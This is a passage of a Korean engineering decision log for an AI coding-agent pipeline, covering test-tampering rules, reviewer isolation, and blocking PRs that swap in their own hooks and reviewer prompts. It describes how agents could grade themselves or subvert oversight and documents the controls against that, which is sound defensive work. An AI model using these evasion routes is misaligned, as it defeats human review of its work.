#### M3/M4 — flaky와 격리에 상한과 경계를 준다
`classify-failure.js`가 실패를 `introduced`/`broken-base`/`flaky-existing` 셋으로 나눈다.
**`broken-base`**: base 실행이 전부 실패하면 그건 흔들림이 아니라 main이 빨간 것 — 제외하지 않고
RED로 남기며 `needs_human: true`와 `broken_base[]`가 판정과 verdict 줄에 붙는다(고칠 것은 이 PR이
아니라 main이다). **`flaky_max`(기본 2)**: 넘으면 하나도 제외하지 않는다(부분 제외는 "어느 둘을
봐줬나"라는 임의의 선택을 남긴다). **격리는 PR이 건드린 테스트를 뒤집지 못한다**(diff에 있는 파일은
격리 목록에 있어도 제외 안 함 — 건드린 테스트를 자기가 면제하는 것은 자기 채점). **`quarantine_max_
effective`(기본 3)**: 한 PR에서 격리가 RED→GREEN으로 뒤집을 수 있는 수의 상한. 제외든 거절이든 판정
파일에 남는다(`quarantine_applied[]`, `quarantine_refused[]`).

**알려진 한계**: `.factory/**` 미러(설치본)는 이 커밋에서 재생성하지 않았다 — `factory init --upgrade`가
별도로 돌아야 `self-mirror` 테스트가 다시 초록이 된다(`factory/bin/lint.js`가 새 파일이라).

**영향**: `required`에 적었으나 레벨 목록에 없던 게이트가 있던 하네스는 이제 MISCONFIGURED로 멈춘다 —
이번 변경에서 가장 시끄러운 부분이고 의도한 바다. `[gates.thresholds]`에 `flaky_max=2`·
`quarantine_max_effective=3`이 추가된다(protected 섹션). 레벨이 셋 다 같던 하네스, lint가 no-op인
하네스는 doctor FAIL이 된다. 판정 파일(`factory.gates.v1`)에 `quarantine_applied[]`/
`quarantine_refused[]`/`broken_base[]`/`broken_base_reason`/`flaky_over_cap`/`needs_human` 필드가
늘었다. 파일: `factory/lib/gates.js`, `factory/lib/classify-failure.js`,
`templates/factory/factory/harness.toml`, `factory/lib/doctor/harness.js`. 테스트: `gates.test.js`
(단언을 먼저 뒤집고 고쳤다), `classify-failure.test.js`, `doctor-harness.test.js`.

---

### Task 4 — 테스트 변조는 정책 위반이고, tier는 단일 출처를 가진다 (H5, H3, M12)

**질문**: H5는 `integrity.js`의 테스트 방어가 test_glob 파일에 **추가된** 줄의 skip pragma 하나뿐이라고
지적했다 — 기존 단언을 고치거나(`toHaveLength(3)`→`(2)`) 테스트 파일을 통째로 지우는 diff가 위반 0으로
자동 머지됐다. H3은 tier가 triage의 자기 신고 한 줄이었고, `tierFloor`가 게이트 레벨만 올리고
`tier_effective`를 읽는 소비처가 0곳이라고 지적했다. M12는 `DOC_GLOBS=["docs/**","*.md"]`가
`docs/factory/CHARTER.md`(판정 기준 그 자체)까지 문서로 읽는다고 지적했다.

**관측**: `[protected].tests_are_load_bearing = true`가 이미 "테스트는 하중을 받는다"고 선언하고
있었지만 그것을 **집행하는 코드가 없었다** — 선언과 집행의 간극이 이 Task 전체의 패턴이다(tier도
마찬가지: `tierFloor`는 있었지만 아무도 그 결과를 읽지 않았다). 감사가 짚은 부수 드리프트: 이
저장소의 소스는 `factory/lib/…`인데 스테이지가 실행하는 설치본은 `.factory/lib/…`라,
`[load_bearing].paths`가 한쪽만 적으면 매치 0으로 tier 바닥이 조용히 사라진다.

**결정**:

#### H5 — 기존 테스트를 고치는 것은 "무엇이 통과인가"를 고치는 것이다
`test_glob`에 매치하는 기존 파일에서 삭제된 줄이 하나라도 있거나(수정은 diff에서 삭제+추가로
나타난다) 테스트 파일이 삭제되면 `policy` 위반: `tests-modified — N line(s) removed from an existing
test — human merge required` / `…existing test file deleted…`. **변조(`violations`)가 아니라
정책(`policy`)인 이유**는 protected/additive_only와 같다 — `factory/integrity`가 branch protection의
유일한 required context라 여기서 RED를 만들면 **사람도** 그 PR을 머지할 수 없다(KTB-5/KTB-6가 그렇게
죽었다). L0(`integrityCheck`)는 GREEN을 유지하며 목록만 싣고, **L1(`merge-stage`)이 자동 머지를
거부**한다. 새 테스트를 쓰는 것(추가만 있는 diff)은 통과한다. 예외는 **이슈 본문**의
`tests_changed_allowed:` 표식 하나뿐이다 — 표식이 이슈 본문(사람이 쓰거나 읽고 승인)에 살고 PR
diff(에이전트가 씀)에는 살지 않는 것이 요점이며, 본문을 못 읽으면 허가가 없는 것으로 친다(fail
closed). 허용된 파일은 위반이 아니라 `tests_allowed` 기록으로 남는다. L0/L1은 `testsPolicy()` 한 몸을
쓴다(additive-only와 같은 이유). `tests_are_load_bearing=false` 하네스에서는 규칙이 아예 안 돈다.
빌더 프롬프트(`factory-implement.js` rule 3)도 "부탁"이 아니라 "집행되는 규칙"이라고 바뀌었다.

#### H3 — `resolveTier()`가 단일 출처가 됐다
```
tier_effective = maxTier(triage tier, tierFloor(base...HEAD diff))
tier_source    = "triage" | "floor"
```
이것을 읽는 곳: `rosterFor`(리뷰·계획 로스터), `planRoundsFor`(Task 9의 `mode`와 라운드 수),
`context.json`, 스테이지 handoff(러너가 `tier_effective`/`tier_source`를 덧쓴다 — 에이전트가 적은
`tier`는 자기 신고 그대로 보존), 그리고 **merge 스테이지의 `reviewRoster`**(정족수의 출처). 신고값은
지우지 않는다(신고와 실효가 갈린 이슈는 retro가 볼 신호). diff를 못 읽으면 바닥은 `standard`다(판정
불가가 docs로 내려앉으면 구멍이 그대로 다시 열린다). Task 2가 세운 **잠정 tier 바닥**(`reviewRoster()`가
triage 자기 신고와 `gates.json.tier_effective`를 `maxTier`로 합치는 것)은 이 커밋에서 삭제한다 —
`reviewRoster`가 이제 `resolveTier`로 같은 값을 base·diff에서 직접 계산한다.

#### M12 — docs tier는 문서에만 적용된다
`tierFloor`가 두 목록을 더 본다: `NEVER_DOCS_GLOBS=[".claude/**","templates/**",".factory/**",
".github/**","factory/**"]`(`.md`여도 문서가 아니다)와 `[protected].factory` 글롭(저장소마다 다른
"사람이 머지해야 하는 경로"는 정의상 docs tier가 아니다) — `docs/factory/CHARTER.md`가 여기서
걸린다. 둘 다 바닥을 올리기만 한다; 진짜 문서(`docs/features/…`, `README.md`)는 그대로 docs다.

#### `[load_bearing].paths` — 설치된 레이아웃을 가리켜야 한다
doctor `load-bearing.paths-exist`: 매치 0인 경로가 있으면 **FAIL**(그 경로를 건드리는 PR이
load-bearing이 아니게 된다), 목록이 비면 **WARN**(신규 저장소의 정상 상태), 전부 매치하면 PASS.
`[protected]`의 글롭 판정과 반대가 의도다 — 보호 경로는 "미래의 경로 모양"을 막아 두는 것이라 지금
매치가 없어도 정상이지만, load-bearing 경로는 지금 존재하는 코드를 가리켜야 바닥이 선다. KTB 자신은
소스 4개+설치본 4개를 모두 적는다(`.factory/lib/{integrity,merge-stage,labels}.js`,
`.factory/bin/run-stage.js`).

**알려진 한계**:
- 워크플로 프롬프트는 이 커밋 시점까지 신고 tier를 보여준다(`factory-review.js`/`factory-plan.js`의
  `loaded.tier`) — 판정에는 영향 없음(로스터·라운드는 이미 실효 tier로 뽑힌다), Task 5가
  `factory-loader`를 걷어내며 `tier_effective`로 자연스럽게 옮긴다.
- `tier_source` 어휘가 두 벌이다(`gates.json`은 `declared`/`promoted-by-diff`, `context.json`/
  handoff는 `triage`/`floor`) — 판정 파일 스키마를 건드리는 일이라 이 Task 범위 밖.
- `tests_changed_allowed:`는 글롭을 받는다 — `test/**/*.test.js` 한 줄로 모든 테스트가 열릴 수
  있다(사람이 그렇게 적으면 사람의 결정); 표식이 넓을수록 `tests_allowed` 기록도 파일별로 남아
  리뷰에서 보인다.
- 이 브랜치는 `factory/lib/**`·`templates/**`를 고쳤지만 `factory init --upgrade`를 이 커밋에서
  돌리지 않았다 — 통합 시점에 미러를 재생성해야 `self-mirror.test.js`가 초록이 된다.

**영향**: `factory/lib/integrity.js`(`testsPolicy`), `factory/lib/context.js`, `factory/lib/gates.js`
(`tierFloor`, `resolveTier`), `factory/lib/merge-stage.js`(`reviewRoster`),
`factory/lib/doctor/harness.js`(`load-bearing.paths-exist`), `factory/bin/run-stage.js`,
`factory/bin/build-context.js`, `factory/bin/integrity.js`, `.factory/harness.toml`,
`templates/factory/factory/harness.toml`, `templates/factory/claude/workflows/factory-implement.js`
(rule 3).

---

### Task 5 — cold read는 파일 경계가 되고, 로더는 사라지고, 겹침은 측정된다 (H4, M5, P2-13)

**질문**: 세 지적이 같은 원인을 가리켰다 — **선언을 강제로 착각했다.** H4: `roles.toml`의
`cold_read=true`(다섯 역할)를 읽는 JS가 하나도 없었다. `context.js`는 네 스테이지 handoff 전부를
`context.json`에 썼고, `factory-review.js`는 리뷰어에게 그 파일을 읽으라고 지시한 뒤 "plan은 읽지
마라"고 **부탁**했다 — `handoffs.implement`(verifier 판정, 신고된 테스트 목록)는 금지 목록에조차
없었고 훅은 읽기를 막지 않는다. M5: 네 workflow가 매번 `factory-loader`(sonnet)를 띄워
`context.json`+`roles.toml`을 읽어 JSON을 JSON으로 옮겨 적게 했는데, 그 에이전트가 필요했던 유일한
이유(`model` 필드)는 `context.js`가 이미 `def.model`로 들고 있었다. P2-13: R2 스키마가 요구하는
`on_others[{id,stance,reason}]`을 리뷰어들이 매 라운드 채워 냈는데 소비하는 코드가 0곳이었다 —
리뷰어 5명을 붙이는 일의 정당성("각자 다른 것을 본다")을 검증할 유일한 재료가 생성만 되고 버려지고
있었다.

**관측**: 감사가 정확히 짚은 대로 **읽기는 훅으로 막을 수 없다**(PreToolUse의 `deny-all-writes.sh`는
쓰기만 본다). 지시로 막는 cold read는 모델이 한 번만 호기심을 내면 무너지고, 무너진 사실이 로그
어디에도 남지 않는다.

**결정**: 막는 자리를 프롬프트에서 파일로 옮긴다 — **읽지 않기로 약속할 필요가 없다, 읽을 것이 거기
없다.**

#### H4 — cold read는 파일 경계다
`buildContext`가 두 종류를 쓴다: `.factory/out/context.json`(오케스트레이터·verify-stage용, 전부)과
`.factory/out/context.<role>.json`(그 역할 하나, `roles.toml`의 `cold_read`가 정한 부분집합).
`roleContextFor(ctx, role)`가 부분집합을 만든다 — `cold_read=true` 역할은 이슈(번호·제목·본문·라벨),
`stage`, `tier`, 로스터 이름, lessons 경로, `spec_path`, CHARTER `limits`, **PR 번호와 head sha**
(builder의 설명이 아니라 "무엇을 판정하는가"의 좌표), 게이트 요약·`maturity`, `done_when`을 네
필드(`id`/`text`/`verify`/`level`)로 깎은 것만 받는다. `handoffs` 키 자체가 파일에 없다 — verifier
판정도, `tests_added`도, `files_expected`/`non_goals`/`dissent_log`도, 다른 리뷰어의 `verdicts`도
존재하지 않는다. `factory-review.js`는 각 리뷰어에게 `contextFor(r)` 경로만 넘기고 전체 파일 경로는
한 번도 주지 않는다(등장하는 유일한 자리는 "열지 마라"는 금지 문장). `cold_read=false`인
spec-conformance는 반대로 전체 파일 + 이슈 본문에서 뽑은 `acceptance` 필드를 받는다(계약 대조가
임무이니 계약이 이슈 본문 안에 있으면 찾아 헤매게 두지 않는다).

#### M5 — `factory-loader`는 삭제됐다
`context.js`가 로더의 산출물을 Node에서 결정적으로 만들어 `.factory/out/loaded.json`에 쓴다
(`issue`/`stage`/`tier`, `roster[{name,agentType,model,lessons,context}]`, `contexts`, `rounds`,
`plan`, `limits`, `spec_path`, `maturity`, `orchestration`, `pr`/`head_sha`, `must_fix`, `disputed`).
디스패처가 그 파일을 Workflow의 `args.loaded`로 그대로 넘기고, 네 workflow는
`const loaded = args.loaded ?? null;` 한 줄로 받는다. 아낀 것: 스테이지마다 sonnet 서브에이전트
1회(triage·plan·implement·review × 매 라운드 — K=3까지 도는 이슈 하나에서 로더 호출이 여섯 번 넘게
있었다). 함께 사라진 것: `.claude/agents/factory-loader.md`, `.factory/lessons/factory-loader.md`,
doctor의 `LOADER_AGENT` 예외, 네 workflow가 공유하던 `LOADER` schema 리터럴. 유지한 것: 네
workflow가 같은 블록을 바이트 단위로 공유한다는 성질(공유 대상이 schema에서 Load 블록으로 바뀌었을
뿐). fail-closed: payload가 없으면 stage 필드 없는 에러 객체뿐이라 `verify-stage`가 needs-human으로
떨어뜨린다.

#### P2-13 — 리뷰어 겹침을 센다
`overlapFrom(verdictSets)`(순수 함수, `factory/lib/retro/harvest.js`). finding 하나를 "제기한 역할"은
(a) must_fix에 적은 역할과 (b) R2에서 `stance:"agree"`로 그 id를 지지한 역할 — `disagree`는 제기가
아니고, 아무도 적지 않은 id에 대한 agree는 세지 않는다. `unique_findings_by_role[role]`(그 역할
혼자 제기한 수)과 `overlap_ratio`(두 역할 이상이 제기한 finding ÷ 전체)를 낸다. 겹침은 런 안에서만
뜻이 있어 `harvest`가 창 안 머지 이슈의 review handoff를 런 단위로 따로 센다; 누적은 비율의 평균이
아니라 분자·분모의 합에서 다시 나온다. `factory status`의 `## 최근 머지` 밑 한 줄과 retro 통계
표(`reviewer overlap`/`unique findings by role`)에 뜬다. 분모가 0인 창은 비율을 만들지 않는다
("판정할 finding이 없었다"와 "겹치지 않았다"는 다른 사실).

**알려진 한계**:
- `disputed`는 Node가 PR 코멘트에서 뽑는다 — 조회 실패 시 빈 배열이며, 이것은 fail-open이 아니다
  (빌더가 이의를 제기하지 않았다는 뜻이 되고 리뷰어의 must_fix는 그대로 살아 있다).
- `agent-md.js`의 쓰기 금지 역할 목록과 `stop-guard.sh`에 `factory-loader` 이름이 아직 있다 —
  존재하지 않는 agent_type에 대한 더 엄격한 규칙이라 해로울 것이 없어 그대로 뒀다.
- 겹침 수치는 표본이 얇다(다크 완주 머지 1건) — 첫 판단 근거가 되려면 리뷰 런이 쌓여야 하고, 그때까지
  이 줄의 역할은 "재료를 버리지 않는다"다.

**영향**: `factory/lib/context.js`(`roleContextFor`, `buildContext`),
`templates/factory/claude/workflows/factory-review.js`, `factory-plan.js`, `factory-triage.js`,
`factory-implement.js`(Load 블록 공유), `factory/lib/retro/harvest.js`(`overlapFrom`),
`factory/lib/status.js`, `.factory/roles.toml`. 파일이 늘었다(`.factory/out/`에 로스터 크기+1 —
전부 스크래치 경로라 무결성·더티 트리 판정 대상이 아니다).

---

### Task 8 — 스테이지는 자기 자신의 설정으로 돈다, PR head의 것이 아니라 (KTB-37, 도그푸딩 발견 — 원 감사 항목 없음)

**질문**: KTB #3(이 저장소의 도그푸드 이슈)가 하네스 이슈 #9로 드러낸 것: `run-stage.js`의
`makeCheckoutHead`가 review·merge 스테이지의 게이트 커밋을 implement handoff의 `head_sha`에 detach로
고정하는데, 그 뒤 뜨는 `claude -p`가 읽는 것 — `--settings .factory/ci-settings.json`,
`.claude/hooks/*`, `.claude/settings.json`, `.claude/agents/*.md`, `docs/factory/CHARTER.md` — 전부
**detach된 워킹 트리**, 곧 **PR의 것**이었다. 이것은 감사 원문의 H1–H6/M1–M13 어디에도 없는, KTB
자신을 다크로 돌리다 발견한 P0급 구멍이라 별도 항목으로 다룬다.

**관측**: 두 결과가 났다. (1) 하네스 수정이 열린 PR에 영원히 닿지 않는다 — KTB #3의 PR head는
KTB-36(CI deny 목록이 `.factory/out/qa`를 여는 수정)보다 앞서서, main에 그 수정이 들어간 뒤에도 #3의
review는 낡은 deny 목록으로 돌아 같은 자리에서 같은 이유로 다시 막혔다(리베이스하려면 한 라운드 더
돌아야 하고, 그 라운드가 또 낡은 설정으로 돈다). (2) 보안: `.claude/hooks/*`·`.claude/settings.json`·
`.factory/ci-settings*.json`·`.claude/agents/*.md`(리뷰어 프롬프트)·`.factory/lib/*`를 바꾼 PR은
**자기 자신의 review·implement 스테이지를 그 변조된 설정으로 실행시킨다** — 보호 경로는 그런 PR의
머지를 사람 손에 맡기지만, 스테이지는 그 전에 이미 돌아 버린 뒤라 사람이 보는 것은 "PR이 써 준
프롬프트와 훅으로 승인된 리뷰"다.

**결정**: 스테이지는 **PR의 코드**를 심판하는 자리이지, 그 심판의 규칙까지 피심판자에게서 받으면
안 된다.

- `resolveStageSha({run,root,env,defaultBranch})` — 이 스테이지 자신의 커밋(CI는 `GITHUB_SHA`, 로컬은
  `origin/<default_branch>`; 40-hex가 아닌 `GITHUB_SHA`는 거부).
- `makeFactoryOverlay(...)` — 그 커밋에서 팩토리 소유 경로만 덮어쓴다:
  `git checkout <stage sha> -- .factory ':(exclude).factory/out' .claude docs/factory/CHARTER.md`
  (`.factory/out/**`은 제외 — 그건 설정이 아니라 이 런이 만들고 있는 산출물). 커밋이 안 들고 있는
  경로는 pathspec에서 빼고(어댑터 레포에 `.claude/`가 없을 수 있다), 덮은 뒤
  `git status --porcelain`으로 실제로 덮인 것을 읽어 런 기록 한 줄로 남긴다
  (`overlay: N path(s) from <sha> …` / 덮을 것이 없으면 `overlay: clean`).
- `runStage`: review·merge의 detach 직후, implement는 빌더를 띄우기 전에 overlay를 돈다.
  **fail closed**: sha를 못 구하거나 커밋이 팩토리 경로를 하나도 안 들고 있거나 `git checkout`/
  `git status`가 실패하면 `factory:blocked`로 전이하고 exit 2 — PR head 설정으로 도는 스테이지는
  없다.
- **implement는 규칙이 뒤집힌다.** implement는 유일한 쓰기 스테이지라 커밋을 빌더가 세션 안에서
  직접 한다(팩토리가 가로챌 수 있는 자리가 아니다) — 그래서 overlay가 **실제로 파일을 바꿨다면**
  그건 워크플로가 준 트리가 스테이지 자신의 커밋이 아니었다는 뜻이고, 그때는 빌더를 **띄우지
  않는다**(blocked). 정상 경로에서 이 overlay는 언제나 no-op이다(`factory-implement.yml`의
  checkout이 이미 이벤트 sha).
- **클린 체크와의 관계.** review의 세션 후 클린 체크(KTB-14)에 overlay가 덮은 **정확한 파일 이름**만
  허용 목록으로 넘긴다(`.claude/**`를 통째로 여는 게 아니다). 세션 중 그 파일들이 다시 바뀌지 않았다는
  것은 `overlayDrift`가 sha와 직접 비교해 따로 증명한다(diff 자체가 실패하면 fail closed).
- 무결성·보호 경로 판정에는 영향이 없다 — `integrity.js`/`protectedPaths`는 워킹 트리가 아니라
  `git diff --name-status`/`git show`로 판정하고(KTB-6/KTB-14와 같은 설계), overlay는 워킹 트리만
  바꾸고 HEAD·base는 건드리지 않는다.

**채택자 영향**: review·merge·implement 스테이지 시작 시 `.factory/**`(out/** 제외)·`.claude/**`·
`docs/factory/CHARTER.md`가 base의 것으로 되돌아간다 — PR이 이 경로들을 고쳤어도 그 변경으로
스테이지가 돌지 않는다(머지 뒤 다음 런부터 적용). 워크플로를 고쳐 PR head를 체크아웃하도록 바꾼
어댑터의 implement 잡은 이제 `factory:blocked`로 선다(의도된 거부). 로컬 `factory run <stage>
<issue>`는 `origin`이 없는 체크아웃에서 blocked로 선다(`git fetch origin` 한 번이면 풀린다). 필요한
조치: `factory init --upgrade`로 `.factory/bin/run-stage.js` 미러 갱신.

**알려진 한계(이 Task가 닫지 않은 것 — 아래 Task 8b가 닫았다)**: rework 라운드의 세션 **내**
체크아웃. implement 빌더는 세션 안에서 자기 브랜치(`claude/fq-<issue>`)를 체크아웃한다 — 그 브랜치가
`.claude/hooks/*`를 변조해 들고 있으면 세션 도중 디스크의 훅 스크립트가 PR의 것으로 바뀔 수 있다
(`--settings`와 훅 배선은 세션 시작 시점 것이지만, 훅 **스크립트**는 호출마다 디스크에서 읽힌다).
완전한 봉쇄는 스테이지가 브랜치 체크아웃을 직접 소유해야 가능하다.

**Task 8b — 그 한계를 닫는다: 브랜치 체크아웃은 스테이지의 것이다.** implement는 이제 `claude -p`
**앞에서** 자기 브랜치를 체크아웃한다(§4.2.1 step 2.3): 원격에 `claude/fq-<issue>`가 있으면
`git fetch origin +refs/heads/claude/fq-<n>:refs/remotes/origin/claude/fq-<n>` 후
`git checkout -B claude/fq-<n> origin/claude/fq-<n>`, 없으면 스테이지 자신의 커밋에서
`git checkout -b`. 원격에 없는데 로컬에만 있으면 **진행하지 않는다**(push되지 않은 커밋을 `-B`로
말없이 지우지 않는다). 그 다음이 overlay(+ PR이 추가한 파일 제거 + 세션 전 drift 검사)이고, 그 다음이
빌더다 — **이 순서가 수정의 전부다**. 빌더 프롬프트·커맨드·에이전트 `.md`에서 체크아웃 지시는
사라졌고("you are ALREADY on the branch"), 훅(`block-dangerous.sh`)이 그것을 강제한다:
`FACTORY_STAGE`가 선 세션에서는 `git switch`와 `--` pathspec 없는 `git checkout <ref>`가 전부 막히고
(`git checkout -- src/x.js` 같은 파일 복원은 그대로 열려 있다), 세션 여부와 무관하게 overlay 뿌리
(`.factory/`·`.claude/`·`CLAUDE*.md`·`AGENTS*.md`·`.mcp*.json`·`docs/factory/CHARTER.md`)를 다른
커밋의 것으로 덮는 `checkout`/`restore --source`와 트리 전체를 갈아 끼우는 `git reset --hard`·
`git stash`(push/pop/apply)가 막힌다 — 이 뿌리는 `factory:harness` 이슈에서도 **열리지 않는다**
(그 카브아웃이 여는 것은 파일 *편집*이지 세션 설정 교체가 아니다). 세션이 끝나면 스테이지가 다시
묻는다: HEAD가 아직 그 브랜치인가, 그리고 팩토리 소유 경로가 아직 스테이지 커밋과 바이트 동일한가
(`overlayDrift` 재실행). 어느 쪽이든 아니면 **판정 불가**이므로 `factory:blocked`이고 게이트도 verify도
돌지 않는다. `FACTORY_STAGE`는 세션이 스스로 지울 수 없다 — 훅은 Claude Code가 세션 env로 띄우는
프로세스라 명령줄의 `VAR= git …` 접두사가 닿지 않는다. 사람의 자기 세션에는 이 변수가 없으므로
`know-thy-build` 스킬들이 시키는 `gh pr checkout <pr>` → `git switch -`는 그대로 돈다.

**Task 8b가 남기는 판정 하나**: 스테이지가 체크아웃한 브랜치가 팩토리 소유 경로를 base와 다르게
들고 있으면(예: `.claude/**`를 고친 PR의 rework 라운드) overlay가
실제로 파일을 바꾸고, 그 자리의 규칙은 KTB-37 그대로다 — **빌더를 띄우지 않는다**(`factory:blocked`).
대안이 둘뿐이기 때문이다: 세션을 PR의 설정으로 돌리거나(이 Task가 닫으려는 바로 그것), 빌더의
`git add -A`가 overlay의 되돌림을 PR에 실어 PR 자신의 변경을 말없이 지우거나. 어느 쪽도 스테이지가
고를 일이 아니다 — 그런 PR은 어차피 `[protected]`라 사람이 머지하므로 그 라운드도 사람에게 넘긴다.

**영향(Task 8b)**: `factory/bin/run-stage.js`(`stageBranch`·`makeCheckoutBranch`·`branchLine`·
`assertStageBranch`·`stageClaudeEnv`의 `FACTORY_STAGE`·runStage 배선 두 자리),
`factory/hooks/block-dangerous.sh`(`ovl` 뿌리 + 브랜치 이동 + `reset --hard`/`stash`),
`templates/factory/claude/workflows/factory-implement.js`·`.../commands/factory-implement.md`(변경
없음 — 체크아웃 지시가 없었다)·`.../agents/factory-builder.md`, 스펙 §4.2.1 step 2.3·step 4.
테스트: `factory/test/run-stage-branch.test.js`(13건 — fetch/checkout 순서·첫 라운드·fail closed
4갈래·로컬 전용 브랜치·세션 뒤 브랜치/drift·runStage 순서 고정·프롬프트 grep),
`factory/test/hooks.test.js`(표 4개 — 스테이지 세션의 브랜치 이동, 사람 세션의 정상 동작, 트리 전체
복원, harness 이슈에서도 안 열리는 overlay 뿌리).

**Task 8b 후속 ① — 하네스 이슈의 rework가 자기 `harness.toml`을 잃지 않는다.** 위 "판정 하나"를
그대로 두면 `factory:harness` 이슈는 **한 라운드 이상 갈 수 없다**: 그 이슈의 rework 라운드는 정의상
`.factory/harness.toml`(그리고 `HARNESS_OPENS`의 나머지)을 고친 브랜치 위에서 돌고, overlay가 그것을
base로 되돌리는 순간 `overlaidPaths`가 비지 않아 빌더가 뜨지 않는다. 하네스 승격은 게이트를 새로
세우는 일이라 1라운드에 끝나는 쪽이 예외다 — 곧 이 규칙은 승격 기능 자체를 막는다. 그래서
`FACTORY_HARNESS_ISSUE=1`인 implement에서는 overlay가 **`HARNESS_OPENS`를 제외한다**
(`overlayPathspecs(harnessIssue)` — `:(exclude,glob)…`가 덮는 `checkout`, PR 추가 파일 스캔, `status`,
`overlayDrift`(세션 전·후) 네 자리 모두에 같은 목록이 들어간다). 열린 목록의 출처는 그대로
`factory/lib/protected-paths.js`의 `HARNESS_OPENS` 하나다 — L2 deny(`ci-settings-harness.json`)·훅
`prot`·overlay가 같은 문장을 말한다. 나머지(훅 스크립트·`.claude/settings*`·에이전트 프롬프트·
ci-settings·CHARTER·`CLAUDE*.md`/`AGENTS*.md`/`.mcp*.json`)는 **여전히 base의 것**이고, 그것들을 고친
하네스 브랜치는 예전 그대로 blocked이다. 무엇이 남아 지키는가: ① harness.toml 안의 위험한 섹션은
L1의 섹션 검사(Task 1 — `[protected]`·`[gates.thresholds]`·`[load_bearing]` 편집 → 사람 머지)가 보고,
② 이 런이 자기 판정에 쓰는 harness는 체크아웃 **전에** `charterReady`가 읽어 메모리에 있다(브랜치의
파일이 이번 런의 임계값·보호 목록을 바꾸지 못한다), ③ 머지는 어차피 사람이다(`[protected]`).

**Task 8b 후속 ② — KTB-38: 낡은 PR 위에서 도는 rework는 base의 도구를 들고 돌아야 한다.**
실측(KTB #3 R5, 2026-09-14): PR #4의 head는 1.2.0 **이전**이라 트리에 `factory/bin/lint.js`가 없었는데,
overlay가 깔아 준 base의 `.factory/harness.toml`은 바로 그 파일을 부르는 lint 명령을 들고 있었다 —
게이트가 통째로 RED였고 빌더는 자기 diff와 무관한, 자기가 고칠 수도 없는 실패를 라운드마다 다시 봤다.
Task 8이 **설정을 base로 고정한 순간부터 이것은 구조적 결과다**: 설정은 base인데 트리는 낡은 PR이면
그 둘이 가리키는 파일 집합이 갈라진다. 그래서 `makeCheckoutBranch`가 **기존 브랜치**를 체크아웃한
직후 base를 얹는다 — `git merge --no-edit --no-ff <stage sha>`(이미 조상이면 건너뛴다: 빈 머지 커밋을
라운드마다 쌓지 않는다), 그리고 빌더가 뜨기 **전에** `git push origin claude/fq-<n>`한다(빌더가
아무것도 바꾸지 않는 라운드에도 PR head가 그 머지를 반영해야 review·merge가 같은 트리를 본다 —
빌더의 push는 빌더의 커밋만 싣는다). 머지 커밋의 저자는 팩토리다(`user.name factory`, 메일은
`FACTORY_BOT_LOGIN`이 있으면 그 로그인의 noreply). 머지 대상이 `origin/<default_branch>`가 **아니라
2.4 overlay와 같은 sha**인 것이 중요하다: 그 사이 main이 더 나갔다면 `origin/main`은 overlay의 sha보다
앞서 있고, 그것을 머지하면 트리의 팩토리 경로가 overlay의 sha와 달라져 overlay가 되돌리고, 그 되돌림이
다시 "덮을 것이 있다 → blocked"이 된다. **한 런 안에서 base는 하나다.** 충돌은 스테이지가 풀 일이
아니다: `git merge --abort`으로 트리를 되돌리고 `factory:blocked` cause `undecidable`, 사유는
`stale PR conflicts with base — rebase by hand` — 사람이 리베이스한다(그래서 `deps.transition`이
`cause`를 그대로 실어 보낸다: 이 자리는 문구가 아니라 **판단**이 등급을 정한다). 새 브랜치 라운드는
애초에 base에서 만들어지므로 머지하지 않는다. 런 기록에 `base_merged: <sha> … pushed before the
builder` 한 줄이 남는다.

**영향(후속 ①②)**: `factory/bin/run-stage.js`(`overlayPathspecs`·`harnessOpenExcludes`·
`makeFactoryOverlay`·`overlayDrift`·`assertStageBranch`·`overlayLine`·`mergeBaseIntoBranch`·
`baseMergedLine`·`makeCheckoutBranch`·runStage 배선 세 자리·`deps.transition`의 `cause`),
스펙 §4.2.1 step 2.3·2.4. 테스트: `factory/test/run-stage-branch.test.js`(+8 — 머지/push 순서·팩토리
저자·이미 조상·첫 라운드 무머지·충돌 abort·fail closed 2갈래·runStage의 undecidable 전이·
`base_merged` 기록), `factory/test/run-stage-overlay.test.js`(+6 — 네 자리 제외 목록·평범한 이슈
불변·세션 뒤 drift·하네스 rework가 빌더를 띄운다·`.claude/hooks/**`는 여전히 blocked·기본값은
harness 모드가 아니다). 채택자 조치: `factory init --upgrade`로 `.factory/bin/run-stage.js` 미러 갱신.

**영향**: `factory/bin/run-stage.js`(`resolveStageSha`, `makeFactoryOverlay`),
`factory/test/run-stage-overlay.test.js`(17건 — 경로 복원·out 제외·조용한 부분 pathspec·fail closed
4갈래·overlayDrift·클린 체크 허용 목록·배선 순서).

이 Task는 위 **리뷰 batch-1**(H1b-b, MF-3)에서 두 구멍이 더 드러난다: overlay가 `CLAUDE.md`·
`.mcp.json`·`AGENTS.md`를 놓치고 있었고, PR이 **추가한** 파일은 `git checkout -- <pathspec>`로
지워지지 않았다. 그 절이 이 Task의 최종 상태다.

---

### Task 9 — plan 기본값은 단일 패스다 (P2-10/11의 결과, Task 7 실험 기반)

**질문**: 감사 P2가 "plan 토론(4토론자×3라운드, 19 에이전트 스폰)이 이슈당 비용의 약 40%인데 그
토론이 막아낸 결함의 기록이 없다"고 지적하며 "plan 기본값을 베이스라인 실험의 결과로 정하라"고
요구했다(P2-10/11). Task 7이 그 실험을 만들었다: `factory/bin/plan-baseline.js`로 단일 opus 1패스+
skeptic 계획을 오프라인으로 돌려 실제 도그푸드 기록(#8/#2/#15/#18)의 review `must_fix`와 대조했다
(`docs/factory/dogfood/2026-09-14-plan-baseline.md`, n=4).

**관측 — 실험 결과**:
- 요구사항 단위 커버리지(느슨 기준, #8 제외): **팩토리 7/15 = 0.47, 베이스라인 8.5/14 = 0.61** —
  베이스라인이 우세.
  - #8(healthz): 둘 다 0/0(공허참) — 단, 팩토리의 **4역할 토론이 스스로 만든 dw1("진입점을
    spawn한다")**이 should_fix 4건의 원인이었다.
  - #2(001 Create note, 저장소 유일의 load-bearing 이슈 — 첫 영속 쓰기 경로+첫 공개 와이어 계약):
    팩토리 4/9=0.44 vs 베이스라인 2.5/8=0.31 — **여기서만 토론이 이겼다**.
  - #15(harness M1→M2): 팩토리 2/3=0.67 vs 베이스라인 3/3=1.00.
  - #18(README): 팩토리 1/3=0.33 vs 베이스라인 3/3=1.00.
- 비용: plan 1패스 기준 **5.4×**, 이슈 전체(재실행 포함) 기준 **33.7×** — $270.26(19패스) vs $8.01.
  #8은 plan에만 $7.78을 쓰고 must_fix 0건, $1.58짜리 1패스가 같은 결과.
- **자해**: must_fix 15건 중 **5건(33%)이 계획이 스스로 발명한 `done_when` 때문**이었다(M15-1,
